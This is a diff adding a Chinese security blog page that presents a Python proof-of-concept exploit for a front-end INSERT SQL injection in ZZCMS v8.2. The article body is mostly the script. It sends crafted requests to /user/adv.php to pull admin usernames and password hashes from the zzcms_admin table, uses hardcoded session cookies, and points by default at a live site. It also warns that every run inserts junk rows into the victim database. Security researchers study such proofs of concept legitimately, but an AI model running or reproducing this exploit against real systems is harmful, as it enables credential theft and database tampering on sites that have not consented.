@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>ZZCMS v8.2前台INSERT注入 | p0c HomePage</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="" />
+  
+
+  <meta name="description" content="原文出自吐司论坛：戳我(╹▽╹) 借文写POC 使用了python的BeautifulSoup从html中提取数据，所以在使用前要确认一下是否安装了BeautifulSoup 使用方法: pip install requests  pip install BeautifulSoup 如果提示No module named bs4 pip install BeautifulSoup4 测试中的一些问">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZZCMS v8.2前台INSERT注入">
+<meta property="og:url" content="https://www.06m.me/2018/05/08/ZZCMS v8.2前台INSERT注入/index.html">
+<meta property="og:site_name" content="p0c HomePage">
+<meta property="og:description" content="原文出自吐司论坛：戳我(╹▽╹) 借文写POC 使用了python的BeautifulSoup从html中提取数据，所以在使用前要确认一下是否安装了BeautifulSoup 使用方法: pip install requests  pip install BeautifulSoup 如果提示No module named bs4 pip install BeautifulSoup4 测试中的一些问">
+<meta property="og:image" content="https://www.06m.me/images/img/zzcms_sql.png">
+<meta property="og:updated_time" content="2018-05-08T14:03:42.992Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ZZCMS v8.2前台INSERT注入">
+<meta name="twitter:description" content="原文出自吐司论坛：戳我(╹▽╹) 借文写POC 使用了python的BeautifulSoup从html中提取数据，所以在使用前要确认一下是否安装了BeautifulSoup 使用方法: pip install requests  pip install BeautifulSoup 如果提示No module named bs4 pip install BeautifulSoup4 测试中的一些问">
+<meta name="twitter:image" content="https://www.06m.me/images/img/zzcms_sql.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-9890636078850478",
+    enable_page_level_ads: true
+  });
+</script>
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">菜单</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">菜单</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+<!--%- partial('_partial/component/toc') %-->
+
+<div class="content content-post CENTER">
+   <article id="post-ZZCMS v8.2前台INSERT注入" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">ZZCMS v8.2前台INSERT注入</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.05.08</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>p0c</span>
+        </span>
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="https://www.06m.me/2018/05/08/ZZCMS v8.2前台INSERT注入/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>原文出自吐司论坛：<a href="https://www.t00ls.net/viewthread.php?tid=44924&amp;highlight=zzcms" target="_blank" rel="noopener">戳我(<em>╹▽╹</em>)</a></p>
+<p>借文写POC</p>
+<p>使用了python的BeautifulSoup从html中提取数据，所以在使用前要确认一下是否安装了BeautifulSoup</p>
+<p>使用方法:</p>
+<pre><code>pip install requests
+ pip install BeautifulSoup
+</code></pre><p>如果提示No module named bs4</p>
+<pre><code>pip install BeautifulSoup4
+</code></pre><p>测试中的一些问题，已经全部解决！可以随便注，要是没有注入，你能出数据，我跪在地上吃屎୧(๑•̀◡•́๑)૭<br>使用随机数解决了重复问题，但同时也面临了大批的数据被插入的情况，这怎么办呢？(O_O)?自己解决吧…<br><img src="/images/img/zzcms_sql.png" alt=""><br>慎重注入！<br>慎重注入！<br>慎重注入！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Author:6m</span><br><span class="line">#每次注入都会向数据库中插入一条数据，为了防止爆出的数据重复，加了一个随机数字，慎重注入！</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def data(html):</span><br><span class="line">	try:</span><br><span class="line">		soup = BeautifulSoup(html,&apos;html.parser&apos;)</span><br><span class="line">		links  = []</span><br><span class="line">		for link in soup.find_all(&apos;a&apos;):</span><br><span class="line">			links.append(link[&apos;href&apos;])</span><br><span class="line">		data=links[32].split(&apos;:&apos;)</span><br><span class="line">		return &apos;Username: %s\nPassword: %s&apos; % (data[0],data[1])</span><br><span class="line">	except:</span><br><span class="line">		return links[32]</span><br><span class="line"></span><br><span class="line">def sql_injection(url):</span><br><span class="line">	rdom = random.randrange(0, 10001, 2) #随机数</span><br><span class="line">	# payload=url+&quot;/user/adv.php?action=add&amp;adv=%s&apos;,&apos;2&apos;,version(),&apos;4&apos;,&apos;%s&apos;,6,&apos;7&apos;)--%%20&amp;advlink=222&amp;company=333&amp;img=111&quot; % (rdom,rdom) #版本</span><br><span class="line">	# payload=url+&quot;/user/adv.php?action=add&amp;adv=%s&apos;,&apos;2&apos;,user(),&apos;4&apos;,&apos;%s&apos;,6,&apos;7&apos;)--%%20&amp;advlink=222&amp;company=333&amp;img=111&quot; % (rdom,rdom) #当前用户</span><br><span class="line">	payload=url+&quot;/user/adv.php?action=add&amp;adv=%s&apos;,&apos;2&apos;,(SELECT concat(admin,&apos;:&apos;,pass) FROM zzcms_admin),&apos;4&apos;,&apos;%s&apos;,6,&apos;7&apos;)--%%20&amp;advlink=222&amp;company=333&amp;img=111&quot; % (rdom,rdom) # (SELECT concat(admin,&apos;:&apos;,pass) FROM zzcms_admin) 注入数据</span><br><span class="line">	cookies = dict(PHPSESSID=&apos;3eemgjdolo6rul1m4bs58bko82&apos;,bdshare_firstime=&apos;1525765917718&apos;,UserName=&apos;%s&apos; % rdom ,PassWord=&apos;cc03e747a6afbbcbf8be7668acfebee5&apos;)</span><br><span class="line">	try: #异常处理</span><br><span class="line">		r = requests.get(payload,cookies=cookies,timeout=2)</span><br><span class="line">		print &apos;zzcms_textadv ID: %s&apos; % rdom</span><br><span class="line">		print data(r.text)</span><br><span class="line">	except:</span><br><span class="line">		print &apos;No injection!&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sql_injection(&apos;http://www.zzcms.com/&apos;)</span><br></pre></td></tr></table></figure>
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，赏个光买包猫粮吧</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/03/27/我们彼此分离-却又终生相依/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <!--div class="fexo-comments comments-post"-->
+  <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = '6x0cm';
+    
+    var disqus_url = 'https://www.06m.me/2018/05/08/ZZCMS v8.2前台INSERT注入/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//6x0cm.disqus.com/count.js" async></script>
+
+
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
